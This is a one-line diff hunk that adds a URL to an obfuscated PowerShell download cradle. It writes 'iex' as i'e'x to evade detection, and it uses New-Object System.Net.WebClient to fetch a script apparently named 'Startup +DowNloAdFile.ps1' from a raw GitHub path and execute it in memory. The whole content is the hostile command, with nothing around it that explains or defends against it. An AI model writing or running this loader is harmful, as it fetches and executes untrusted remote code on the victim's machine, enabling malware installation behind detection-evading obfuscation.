@@ -1,1 +1,1 @@
-i'e'x ((New-Object System.Net.WebClient).DownloadString(''))
+i'e'x ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wasawalid/getv/main/spamget/Startup%20%2BDowNloAdFile.ps1'))
